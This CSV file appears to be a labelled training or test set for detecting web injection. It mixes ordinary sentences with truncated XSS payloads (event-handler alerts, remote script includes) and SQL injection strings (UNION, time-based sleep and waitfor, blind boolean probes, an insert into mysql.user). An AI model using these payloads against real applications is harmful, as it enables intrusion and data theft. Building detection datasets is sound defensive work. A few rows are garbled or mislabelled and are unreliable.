Payload,Label,text_label,ID
"select count ( * ) from all_users t1,all_users t2,",2,SQLi,20933
He turns to a press aide who will select the quest,0,normal,26112
<dialog id=x tabindex=1 onactivate=alert(1)></dial,1,XSS,8120
"![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFN",1,XSS,9413
-4904' ) as ogyu where 2821 = 2821 or 5982 = 1643,2,SQLi,16632
"1"" ) as zuzm where 1211 = 1211 and elt ( 5458 = 29",2,SQLi,21214
"<object data=""javascript:alert(1)"">",1,XSS,145
"The select committee won out. Issa, understandably",0,normal,25351
"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ",2,SQLi,12597
"<style>@keyframes x{}</style><abbr style=""animatio",1,XSS,4046
"<hgroup onmouseenter=""alert(1)"">test</hgroup>",1,XSS,7503
<button onMediaError=javascript:alert(1)>,1,XSS,9629
ORDER BY 18--,2,SQLi,10260
1%' or ( select * from ( select ( sleep ( 5 ) ) ) ,2,SQLi,12801
"<body onkeydown body onkeydown=""javascript:javascr",1,XSS,411
<style>:target {color:red;}</style><frame id=x sty,1,XSS,5838
"<sub onclick=""alert(1)"">test</sub>",1,XSS,8734
"<body onhashchange=""alert(1)"">",1,XSS,6075
"<ol onclick=""alert(1)"">test</ol>",1,XSS,4637
"SYDNEY, AUSTRALIA ""The Nose,"" Sydney Opera House S",0,normal,25511
<style>:target {color:red;}</style><nav id=x style,1,XSS,8883
-9393' where 3119 = 3119 or 8571 = 8571--,2,SQLi,21201
"<html oncut=""alert(1)"" contenteditable>test</html>",1,XSS,4662
"<hr draggable=""true"" ondragend=""alert(1)"">test</hr",1,XSS,7935
"<;A HREF="";http://google.com/"";>;XSS<;/A>;",1,XSS,1677
<input3 onpointermove=alert(1)>XSS</input3>,1,XSS,8477
"{""id"":null,""name"":""tail""}",0,normal,27110
<style>:target {color:red;}</style><head id=x styl,1,XSS,8378
If you want to select certain contacts to download,0,normal,26041
"UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMA",2,SQLi,10673
The Financial Select Sector SPDR Fund (XLF) droppe,0,normal,25447
"1%"" ) and 6414 = ( select count ( * ) from rdb$fie",2,SQLi,17014
<script>javascript:alert(1)</script\x0D,1,XSS,417
1' where 7725 = 7725 or ( select * from ( select (,2,SQLi,19317
Randomly select a meal.,0,normal,24438
1' ) ) and 9254 = ( select count ( * ) from rdb$fi,2,SQLi,21725
"<svg onmouseleave=""alert(1)"">test</svg>",1,XSS,5477
-1769 union all select 6054--,2,SQLi,20054
<blink id=x tabindex=1 onfocus=alert(1)></blink>,1,XSS,6701
Where's the yoga studio?,0,normal,23600
<animate onpointerdown=alert(1)>XSS</animate>,1,XSS,6541
"-7916' ) ) union all select 9299,9299,9299,9299,92",2,SQLi,18058
"-6890"" ) ) or 5903 = ( 'qqpjq'|| ( select case 590",2,SQLi,18467
They ordered a pepperoni pie.,0,normal,23005
"1' ) and ( select 9067 from ( select count ( * ) ,",2,SQLi,18437
select current_setting('log_statement');,2,SQLi,22505
"{""id"":null,""name"":""Sandile""}",0,normal,27304
She updates her hairstyle.,0,normal,23000
"<xss ondblclick=""alert(1)"" autofocus tabindex=1 st",1,XSS,60
"{""id"":null,""firstName"":""Kirin"",""lastName"":""Swatan""",0,normal,27330
Update style.,0,normal,23048
1' where 4880 = 4880 and ( select 2* ( if ( ( sele,2,SQLi,17449
<html id=x tabindex=1 onfocus=alert(1)></html>,1,XSS,6753
"{""id"":null,""firstName"":""Muhammad Imran"",""lastName""",0,normal,27100
I want to select a song for our dance routine.,0,normal,23872
"-9297 ) union all select 6841,6841,6841,6841,6841-",2,SQLi,19034
"<set attributeName=""onmouseover"" to=""alert(89)""/>",1,XSS,9303
"<input type=""text"" value=`` <div/onmouseover='aler",1,XSS,891
"<content oncut=""alert(1)"" contenteditable>test</co",1,XSS,2267
ORDER BY 21--,2,SQLi,10263
"1, ( select ( case when ( 8392 = 8404 ) then 1 els",2,SQLi,17443
"-6263%"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhas",2,SQLi,19606
"&lt;A HREF=\""//www&#46;google&#46;com/\""&gt;XSS&lt",1,XSS,1055
<iframe src=%22404%22 onload=%22self.frames[0].doc,1,XSS,9198
"<marquee draggable=""true"" ondragenter=""alert(1)"">t",1,XSS,5315
1' ) as lgex where 4068 = 4068 and 1378 = 9247--,2,SQLi,19474
-5396'|| ( select 'fjhd' from dual where 4019 = 40,2,SQLi,16700
"<multicol onbeforecopy=""alert(1)"" contenteditable>",1,XSS,3064
"<legend onkeyup=""alert(1)"" contenteditable>test</l",1,XSS,7051
Select your influence.,0,normal,24874
1 ) ) as uizx where 2512 = 2512 and make_set ( 140,2,SQLi,13784
select * from users where id = 1 union select +!<1,2,SQLi,11574
"{""id"":null,""firstName"":""Jackie"",""lastName"":""Wee"",""",0,normal,26983
-1711 ) where 9098 = 9098 order by 1#,2,SQLi,19163
"select like ( 'abcdefg',upper ( hex ( randomblob (",2,SQLi,15136
"<command onbeforepaste=""alert(1)"" contenteditable>",1,XSS,3685
declare @q nvarchar (4000) select @q =,2,SQLi,10171
"<var oncut=""alert(1)"" contenteditable>test</var>",1,XSS,6521
"<p onbeforecut=""alert(1)"" contenteditable>test</p>",1,XSS,6497
"-9606%"" ) ) ) union all select 8572,8572,8572,8572",2,SQLi,16818
Select the top performer.,0,normal,24335
Select glow.,0,normal,24679
"1"" ) ) procedure analyse ( extractvalue ( 9255,con",2,SQLi,19081
1'+ ( select 'ngdk' where 7264 = 7264 and 3202 = l,2,SQLi,19487
"<hgroup onbeforepaste=""alert(1)"" contenteditable>t",1,XSS,3197
1%' ) ) ) and 7219 = 7361 and ( ( ( '%' = ',2,SQLi,14846
1 ) where 6082 = 6082 and ( select 9067 from ( sel,2,SQLi,21687
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10479
Carefully select options.,0,normal,24416
<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><!,1,XSS,292
"<div id=""130""><math href=""javascript:alert(130)"">C",1,XSS,9119
"1 ) and updatexml ( 3393,concat ( 0x2e,0x7171706a7",2,SQLi,13063
<input3 onpointerup=alert(1)>XSS</input3>,1,XSS,2510
"1%' ) ) union all select null,null,null,null,null#",2,SQLi,12088
"<noframes draggable=""true"" ondragleave=""alert(1)"">",1,XSS,2728
<a id=x tabindex=1 onbeforeactivate=alert(1)></a>,1,XSS,2611
Of the immense number of indications accompanying ,0,normal,25855
"Select the Sharing tab, then under ' Local sharing",0,normal,25581
"1"" ) ) as ktue where 6392 = 6392 and 8514 = ( sele",2,SQLi,13504
"-3270%' or elt ( 9404 = 3498,3498 ) and '%' = '",2,SQLi,16079
<style>@keyframes slidein {}</style><template styl,1,XSS,6702
<address onblur=alert(1) tabindex=1 id=x></address,1,XSS,8040
"1' and ( select 9067 from ( select count ( * ) ,co",2,SQLi,14420
<data id=x tabindex=1 onactivate=alert(1)></data>,1,XSS,4710
"<tt onbeforecopy=""alert(1)"" contenteditable>test</",1,XSS,4374
Always select the soft furnishings before landing ,0,normal,26382
-3861' ) as zmja where 4036 = 4036 or 9323 = 9323#,2,SQLi,14097
He ordered a latte from the coffee shop.,0,normal,23881
<SCRIPT FOR=document EVENT=onreadystatechange>java,1,XSS,636
<cite onpointerleave=alert(1)>XSS</cite>,1,XSS,8450
"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ",2,SQLi,19780
1'+ ( select lhtn where 8484 = 8484 and char ( 111,2,SQLi,15083
><script+src=https://api.mixpanel.com/track/?callb,1,XSS,9814
1'+ ( select 'sbji' where 7989 = 7989 rlike ( sele,2,SQLi,13684
1%' ) ) ) union all select null--,2,SQLi,17062
"{""id"":null,""firstName"":""Tan"",""lastName"":""May"",""add",0,normal,27050
-8553'+ ( select adko where 1750 = 1750 union all ,2,SQLi,20659
1 where 6044 = 6044 or ( select 2* ( if ( ( select,2,SQLi,19390
1'|| ( select 'jpow' from dual where 4381 = 4381 a,2,SQLi,14627
Select your favorite artist.,0,normal,24308
"-9008' ) union all select 4976,4976,4976,4976#",2,SQLi,20072
"<head onmouseenter=""alert(1)"">test</head>",1,XSS,8717
-9924 ) ) as zgqa where 2867 = 2867 union all sele,2,SQLi,18707
1'|| ( select 'asfl' from dual where 5846 = 5846 o,2,SQLi,20916
<acronym onpointerleave=alert(1)>XSS</acronym>,1,XSS,2466
<noembed onpointerdown=alert(1)>XSS</noembed>,1,XSS,6923
<svg><x><script>alert('1'&#41</x>,1,XSS,9467
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20",2,SQLi,10960
"-9978"" or make_set ( 4893 = 9765,9765 ) and ""mhjt""",2,SQLi,13649
1'|| ( select 'pxkz' where 2207 = 2207 and ( 3020 ,2,SQLi,19987
"1"" ) ) as tljw where 8474 = 8474 and 6240 = ( 'qqp",2,SQLi,19038
><script src=//brutelogic.com.br&sol;1.js&num;,1,XSS,8961
"1"" ) rlike ( select ( case when ( 5746 = 5367 ) th",2,SQLi,15380
"select * from users where id = 1 union select 1a#,",2,SQLi,12069
Insert the clip.,0,normal,22870
"<summary onmouseleave=""alert(1)"">test</summary>",1,XSS,8606
<style>:target {transform: rotate(180deg);}</style,1,XSS,3055
Filter data where needed.,0,normal,23457
"<;IMG LOWSRC="";javascript:alert(';XSS';);"";>;",1,XSS,1596
"1%' and 2388 = benchmark ( 5000000,md5 ( 0x6d45715",2,SQLi,14750
-1499 ) as gxfm where 9762 = 9762 or 5989 = 4782--,2,SQLi,14640
><script src=//ajax.googleapis.com/ajax/services/f,1,XSS,9819
"<bgsound onmousemove=""alert(1)"">test</bgsound>",1,XSS,4975
"<IMG SRC=x ondrag=""alert(String.fromCharCode(88,83",1,XSS,1207
select,0,normal,26589
"iif ( 1217 = 8831,1,1/0 )",2,SQLi,21301
"{""id"":null,""name"":""Eevee""}",0,normal,26749
"{""id"":null,""firstName"":""Brandon"",""lastName"":""Cai"",",0,normal,26842
1' where 6902 = 6902 and 6055 = ctxsys.drithsx.sn ,2,SQLi,21487
<script onpointerover=alert(1)>XSS</script>,1,XSS,3661
1' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ,2,SQLi,13542
Select play.,0,normal,24721
if ( 7340 = 9813 ) select 7340 else drop function ,2,SQLi,19879
"<shadow draggable=""true"" ondragleave=""alert(1)"">te",1,XSS,2310
"<shadow onbeforecopy=""alert(1)"" contenteditable>te",1,XSS,8195
"( updatexml ( 8862,concat ( 0x2e,0x7171706a71, ( s",2,SQLi,20073
waitfor delay '0:0:5' and 'dfzn' = 'dfzn,2,SQLi,12923
<div contextmenu=xss><p>Right click<menu type=cont,1,XSS,103
"<cite onmousemove=""alert(1)"">test</cite>",1,XSS,4582
"<SCRIPT ="">"" SRC=""httx://xss.rocks/xss.js""></SCRIP",1,XSS,305
<style>:target {transform: rotate(180deg);}</style,1,XSS,7775
Select your inquire.,0,normal,24966
"1"" or 7552 = ( select count ( * ) from rdb$fields ",2,SQLi,14470
<script>var request = new XMLHttpRequest();request,1,XSS,9294
Select your favorite dishware.,0,normal,24340
1'+ ( select zmbu where 8685 = 8685 rlike ( select,2,SQLi,16605
"<p onkeypress=""alert(1)"" contenteditable>test</p>",1,XSS,7793
"-9171 ) union all select 6880,6880,6880,6880,6880,",2,SQLi,19153
"<IMG SRC=x ondblclick=""alert(String.fromCharCode(8",1,XSS,1199
ÃÂ¢Ãâ¬ÃË or 1 = 1 --,2,SQLi,22487
ORDER BY 15#,2,SQLi,10288
<svg><col onload=alert(1)></col>,1,XSS,3672
1' ) ) as uuuk where 7234 = 7234 and 6537 = dbms_p,2,SQLi,13643
AND 1=utl_inaddr.get_host_address((SELECT COUNT(DI,2,SQLi,11073
"1%' ) ) and elt ( 4249 = 4249,7259 ) and ( ( '%' =",2,SQLi,16543
1' ) and ( 3020 = 3020 ) *6703,2,SQLi,20205
"<track onclick=""alert(1)"">test</track>",1,XSS,2706
1' ) ) and 2401 = 4693 and ( ( 'ssrm' = 'ssrm,2,SQLi,14131
Select an app in the list and then tap Permissions,0,normal,25651
"<input onmousedown=""alert(1)"">test</input>",1,XSS,4052
select ( case when ( 4780 = 4432 ) then 4780 else ,2,SQLi,17131
1 or ( select * from ( select ( sleep ( 5 ) ) ) yd,2,SQLi,12588
<BODY ONLOAD=alert('')>,1,XSS,4466
"<style>@keyframes x{}</style><aside style=""animati",1,XSS,8103
"1 ) ) ) procedure analyse ( extractvalue ( 5840,co",2,SQLi,14712
1' ) ) ( select ( case when ( 4587 = 4587 ) then r,2,SQLi,12346
Where did you find that charming restaurant?,0,normal,23926
"1' where 8969 = 8969 union all select null,null,nu",2,SQLi,19728
-9456%' ) ) ) order by 1#,2,SQLi,22485
The company began testing pickup at select locatio,0,normal,25471
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10",2,SQLi,10512
<svg><nobr onload=alert(1)></nobr>,1,XSS,3205
end and ( 'unko' = 'unko,2,SQLi,22359
"1"" ) as tuem where 1328 = 1328",2,SQLi,14088
"<style>@keyframes x{}</style><sup style=""animation",1,XSS,6530
Select like.,0,normal,24742
"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay",2,SQLi,10901
"#getURL,javascript:alert(1)"",",1,XSS,9856
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,14891
1%' ) ) and 8594 = ( select 8594 from pg_sleep ( 5,2,SQLi,13998
"insert into mysql.user ( user, host, password ) va",2,SQLi,11504
"<a href=""jAvAsCrIpT&colon;alert&lpar;1&rpar;"">X</a",1,XSS,881
"-2864' ) or 1570 = convert ( int, ( select char ( ",2,SQLi,16050
"1%"" ) union all select null--",2,SQLi,14329
Select a skincare product to try.,0,normal,24090
"1"" ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ",2,SQLi,15810
"<colgroup oncut=""alert(1)"" contenteditable>test</c",1,XSS,5679
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%6,1,XSS,9736
"select * from users where id = 1 or ""]."" or 1 = 1 ",2,SQLi,11872
How to select all the photos in a folder or on you,0,normal,26076
"<legend draggable=""true"" ondrag=""alert(1)"">test</l",1,XSS,7430
#ERROR!,2,SQLi,22544
select ( case when ( 8234 = 2498 ) then 8234 else ,2,SQLi,16206
Select truck.,0,normal,24704
<main onpointerdown=alert(1)>XSS</main>,1,XSS,2970
"<hgroup onkeydown=""alert(1)"" contenteditable>test<",1,XSS,8398
1%' ) ) or 8156 = ( select count ( * ) from genera,2,SQLi,15876
#ERROR!,2,SQLi,10981
-5225' ) ) as zats where 5629 = 5629 union all sel,2,SQLi,14513
"select * from users where id = 1 or "" ( ."" or 1 = ",2,SQLi,11512
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2103
"<applet ondblclick=""alert(1)"">test</applet>",1,XSS,4143
"<u onmousedown=""alert(1)"">test</u>",1,XSS,3612
"<section onmouseenter=""alert(1)"">test</section>",1,XSS,2396
Spending out of a cape cod click on select.,0,normal,25527
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20",2,SQLi,10961
"Peach + Lily â Select items 50 percent off, throug",0,normal,25787
Select options.,0,normal,23008
-2181' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 11,2,SQLi,16332
"<bgsound onkeyup=""alert(1)"" contenteditable>test</",1,XSS,7527
onmouseover=alert(1)//%27%22--%3E%3C%2Fstyle%3E%3C,1,XSS,8996
"1"" ) as klur where 7046 = 7046 and 3202 = like ( '",2,SQLi,14011
AND 7300=7300 AND ('pKlZ'='pKlY,2,SQLi,10230
&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()},1,XSS,1368
"<img src\x11=x onerror=""javascript:alert(1)"">",1,XSS,669
1' ) ) and 2716 = ( select count ( * ) from sysuse,2,SQLi,18824
) WAITFOR DELAY '0:0:5'--,2,SQLi,11324
<audio controls autoplay ontimeupdate=alert(1)><so,1,XSS,36
<style>@keyframes x{from {left:0;}to {left: 1000px,1,XSS,3705
1' ) ) ) and ( 3020 = 3020 ) *6703 and ( ( ( 'qfxg,2,SQLi,22383
-3116 ) ) as jyiq where 3875 = 3875 union all sele,2,SQLi,21141
"<q onmousemove=""alert(1)"">test</q>",1,XSS,2344
"<details onmouseover=""alert(1)"">test</details>",1,XSS,8845
[1].find(alert),1,XSS,1986
UNION ALL SELECT,2,SQLi,10078
Select your organization.,0,normal,24862
-3535%' ) ) ) or 5605 = 4660 and ( ( ( '%' = ',2,SQLi,18006
1'+ ( select kzgg where 5070 = 5070,2,SQLi,18814
if ( 2823 = 3532 ) select 2823 else drop function ,2,SQLi,18887
<style>:target {color: red;}</style><sub id=x styl,1,XSS,2505
Select your state.,0,normal,24959
"<var onclick=""alert(1)"">test</var>",1,XSS,2760
Calculate totals where needed.,0,normal,23463
You also get one free checked bag to select intern,0,normal,25105
"<mark onmouseover=""alert(1)"">test</mark>",1,XSS,7476
"<body onkeypress=""alert(1)"" contenteditable>test</",1,XSS,6981
<data id=x tabindex=1 onfocus=alert(1)></data>,1,XSS,2678
"<;IMG STYLE="";xss:expr/*XSS*/ession(alert(';XSS';)",1,XSS,1613
"-9382' ) union all select 4774,4774,4774,4774--",2,SQLi,19281
"1"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 7",2,SQLi,17281
having 1=1--,2,SQLi,10140
"<caption onclick=""alert(1)"">test</caption>",1,XSS,6103
; begin declare @var varchar(8000) set @var=':' se,2,SQLi,11124
"-9881"" ) ) or 9850 = 8118#",2,SQLi,12385
"1' ) ) union all select null,null,null,null,null,n",2,SQLi,19362
select,0,normal,26608
Instead they had to manually select Stories to loa,0,normal,25982
*{color:gre/**/en !/**/important} /* IE 6-9 Standa,1,XSS,9009
"<input oncut=alert(1) value=""XSS"" autofocus>",1,XSS,3802
<input2 onpointerenter=alert(1)>XSS</input2>,1,XSS,7022
"<style>@keyframes x{}</style><caption style=""anima",1,XSS,4107
-4215 ) where 5782 = 5782 or 2724 in ( ( char ( 11,2,SQLi,22430
1' ) ) and 5556 = ( select count ( * ) from all_us,2,SQLi,14413
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3575
1' ) ) waitfor delay '0:0:5' and ( ( 'bbqk' = 'bbq,2,SQLi,19461
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,14520
1'+ ( select snam where 1993 = 1993,2,SQLi,18854
"<picture onkeypress=""alert(1)"" contenteditable>tes",1,XSS,2903
"<tfoot onmouseleave=""alert(1)"">test</tfoot>",1,XSS,7542
1 ) ) and 3228 = 7376#,2,SQLi,15670
Warner and Rubio are on the Senate Select Committe,0,normal,25179
waitfor delay '0:0:5' ) ||',2,SQLi,21577
"1 ) where 9012 = 9012 and 3202 = like ( 'abcdefg',",2,SQLi,17780
"1 ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d4",2,SQLi,17616
<ol onpointermove=alert(1)>XSS</ol>,1,XSS,3483
1 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||cha,2,SQLi,21909
and 1=0) union all,2,SQLi,11054
1' where 7910 = 7910,2,SQLi,20664
"1%"" ) ) ) procedure analyse ( extractvalue ( 5840,",2,SQLi,17642
"<div draggable=""true"" ondrag=""alert(1)"">test</div>",1,XSS,4530
"1 ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( r",2,SQLi,16615
"""hi"""" ) or ( """"a"""" = """"a""",2,SQLi,11841
"-3498"" ) ) as xbvb where 2056 = 2056 union all sel",2,SQLi,16819
"<time onbeforepaste=""alert(1)"" contenteditable>tes",1,XSS,6136
1%' ) ) ) and 9254 = ( select count ( * ) from rdb,2,SQLi,13215
"<template onmouseup=""alert(1)"">test</template>",1,XSS,6301
"1' ) and elt ( 7554 = 6257,6257 ) and ( 'bpzm' = '",2,SQLi,17719
Sort the cards.,0,normal,22801
1 ) where 5866 = 5866 and 4595 = 4595#,2,SQLi,20583
1'|| ( select 'ojdz' where 7350 = 7350 and 6510 = ,2,SQLi,16495
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,5548
1'+ ( select tafk where 9652 = 9652,2,SQLi,21949
unique,0,normal,23177
Update your plans.,0,normal,22787
<iframe/onreadystatechange=\u0061\u006C\u0065\u007,1,XSS,903
"1%' ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7",2,SQLi,14387
"1%"" ) and extractvalue ( 7982,concat ( 0x5c,0x7171",2,SQLi,12792
"-9462"" ) as vzga where 4799 = 4799 or 8691 = 1048",2,SQLi,22244
"<xmp onmouseleave=""alert(1)"">test</xmp>",1,XSS,2956
"1"" ) and 9660 = ( select count ( * ) from all_user",2,SQLi,17255
"1' ) where 7658 = 7658 union all select null,null#",2,SQLi,14863
"Choose, select.",0,normal,24778
"<rt draggable=""true"" ondragstart=""alert(1)"">test</",1,XSS,4368
<area onpointerenter=alert(1)>XSS</area>,1,XSS,1837
1 ) rlike sleep ( 5 ) and ( 5724 = 5724,2,SQLi,15433
<style>:target {color:red;}</style><kbd id=x style,1,XSS,6422
"<style><img src=""</style><img src=x onerror=alert(",1,XSS,961
"{""id"":null,""firstName"":""Zi Yang"",""lastName"":""Wong""",0,normal,27457
"<shadow draggable=""true"" ondrag=""alert(1)"">test</s",1,XSS,7674
"{""id"":null,""name"":""bowl sad""}",0,normal,27021
1'|| ( select 'aioq' from dual where 8176 = 8176,2,SQLi,14446
<font id=x tabindex=1 onbeforeactivate=alert(1)></,1,XSS,8855
"<mark onmousemove=""alert(1)"">test</mark>",1,XSS,3569
"<style>@keyframes x{}</style><dfn style=""animation",1,XSS,7281
<SCRIPT SRC=http://xss.rocks/xss.js?< B >,1,XSS,264
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10690
1 ) as uhmm where 2304 = 2304 union all select nul,2,SQLi,17465
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10633
"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20",2,SQLi,10886
"ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,",2,SQLi,10458
1'|| ( select 'brde' where 7390 = 7390 and 4386 = ,2,SQLi,17259
"<script src=""data:\xE0\xA4\x98,javascript:alert(1)",1,XSS,460
1' ) rlike ( select ( case when ( 7447 = 3981 ) th,2,SQLi,20675
It was followed by two little volumes of similar c,0,normal,25952
"1"" ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +c",2,SQLi,21383
1'|| ( select 'bqhi' from dual where 7409 = 7409,2,SQLi,15124
1' ) as rqfq where 7077 = 7077 or 2367 = ( select ,2,SQLi,13758
Select the most relevant data for analysis.,0,normal,24043
"select * from users where id = 1 or ""; ( "" or 1 = ",2,SQLi,11715
select * from users where id = 1 | |1 union select,2,SQLi,11704
&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http:/,1,XSS,1459
1 ) as nwfz where 7365 = 7365 and 4386 = utl_inadd,2,SQLi,17909
"<noembed onkeydown=""alert(1)"" contenteditable>test",1,XSS,3163
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,17241
"1"" ) as uyns where 4751 = 4751 and ( select * from",2,SQLi,21709
<basefont id=x tabindex=1 onfocusin=alert(1)></bas,1,XSS,6782
-5356' ) or 9323 = 9323#,2,SQLi,16795
"-5539"" ) union all select 6189,6189,6189,6189,6189",2,SQLi,15211
1'|| ( select 'dezl' where 8661 = 8661,2,SQLi,17053
end and ( ( '%' = ',2,SQLi,14912
Modi nd his Govt have no guts b ban anyone of thei,0,normal,26489
"1%' ) ) union all select null,null,null,null,null,",2,SQLi,14583
